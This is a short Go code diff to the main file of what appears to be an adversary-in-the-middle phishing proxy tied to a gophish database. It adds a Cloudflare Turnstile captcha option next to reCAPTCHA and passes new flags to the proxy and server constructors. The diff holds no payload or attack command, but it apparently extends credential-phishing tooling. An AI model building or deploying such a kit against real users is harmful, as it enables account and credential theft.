@@ -22,6 +22,7 @@ var cfg_dir = flag.String("c", "", "Configuration directory path")
 var gophish_db = flag.String("g", "", "Full path to gophish database")
 var feed_enabled = flag.Bool("feed", false, "Enable live feed")
 var recaptcha = flag.String("captcha", "", "Recaptcha public/private key seperated by \":\"")
+var turnstile = flag.String("turnstile", "", "Turnstile public/private key separated by \":\"")
 
 func joinPath(base_path string, rel_path string) string {
     var ret string
@@ -160,21 +161,30 @@ func main() {
     var crt_db *core.CertDb
     if *recaptcha != "" {
         sep := strings.Split(*recaptcha, ":")
-        hs, _ = core.NewHttpServer(sep[0], sep[1], true)        
+        hs, _ = core.NewHttpServer(sep[0], sep[1], "", "", true, false)        
         crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
         if err != nil {
             log.Fatal("certdb: %v", err)
             return
         }
-        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
+        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true, false)
+    } else if *turnstile != "" { 
+        sep := strings.Split(*turnstile, ":")
+        hs, _ = core.NewHttpServer("", "", sep[0], sep[1], false, true)        
+        crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
+        if err != nil {
+            log.Fatal("certdb: %v", err)
+            return
+        }
+        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false, true)
     } else {
-        hs, _ = core.NewHttpServer("", "", false)
+        hs, _ = core.NewHttpServer("", "", "", "", false, false)
         crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
         if err != nil {
             log.Fatal("certdb: %v", err)
             return
         }
-        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
+        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false, false)
     }
     hs.Start(hp)
     hp.Start()
